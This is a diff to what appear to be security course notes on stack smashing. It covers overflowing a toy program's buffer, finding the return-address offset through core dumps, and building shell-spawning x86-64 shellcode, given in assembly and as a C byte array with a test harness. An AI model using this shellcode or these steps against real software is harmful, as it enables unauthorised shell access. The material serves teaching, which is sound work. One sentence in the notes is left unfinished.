@@ -51,9 +51,66 @@ The trick lies in the stack layout, and we can obtain the layout by analyzing it
 
 Let's assume the our porpose is to enforce the function to return 1, so we can trace the data flow of the return value backwards. Starting from Line <+106>, we know the return value of the register (%eax) is moved from the stack -0x4(%rbp). Line <+99> saves 0x0 to -0x4(%rbp), while Line <+62> saves 0x1 to -0x4(%rbp). So we can tamper the buffer of -0x4(%rbp) to bypass the validation. Line <+4> tells us the assembly code increases the stack size with 0x50. We can compute the offset of -0x4(%rbp) to the register %rsp should be 0x4b or 76 in decimal. In order to let the function return 1, we can input a 76-byte buf with the last four bytes to be 1.
 
-### Steps of Stack Smashing
-- Step 1. Detect buffer overflow bugs: Find an input that crashes a program e.g., via fuzz testing. 
-- Step 2. Analyze stack layout of the buggy code
-- Step 3. Design the exploit: To obtain the shell. e.g., with return-oriented programming
+### Stack Smashing
+A stack smashing attack contains three major steps:
+- Step 1. Detect buffer overflow bugs or find an input that can crash a program. This is usually done via fuzz testing. 
+- Step 2. Analyze stack layout of the buggy code. In practice, attackers may not be able to obtain the executables. 
+- Step 3. Design the exploit. To obtain the shell. e.g., with return-oriented programming.
+
+Now, we discuss a more general senario, i.e., 1) the attacker cannot obtain the binaries, and 2) his goal is to obtain the shell. 
+
+#### Stack Layout Analysis
+The purpose is to obtain the offset of the return address so that we can point it to the another code address, e.g., shell code. Let's still use our previous toy program for demonstration. The idea is to input several 'A's (hexdecimal ASCII: 0X41). If it has changed the return addresses, then the program will not be able to continue the execution and report the bad return address. We can gradually increase the length of the input to learn the offset of the return address. 
+
+Before experiments, we need to turn on the core dump message
+```
+#: ulimit -c unlimited
+#: sudo sysctl -w kernel.core_pattern=core
+```
+
+Input several 'A's and check the core dump message.
+```
+#: python -c 'print "A"*92'
+#:./bug 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA…
+Wrong license!
+Segmentation fault (core dumped)
+
+#: gdb --core core 
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000a41414141 in ?? ()
+```
+The log message 
+
+#### Design the Exploit 
+```
+xor eax, eax
+mov 0xFF978CD091969DD1, rbx
+neg rbx
+push rbx
+push rsp
+pop rdi
+cdq
+push rdx
+push rdi
+push rsp
+pop rsi
+mov 0x3b, al
+syscall
+```
+
+```
+const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+int main (void) {
+  char buf[256];
+  int len = sizeof(shellcode);
+  for(int i=0; i<len; i++)
+	 buf[i] = shellcode[i]; 
+  ((void (*) (void)) buf) ();
+}
+```
+
 
 ## Section 2. Protection Techniques
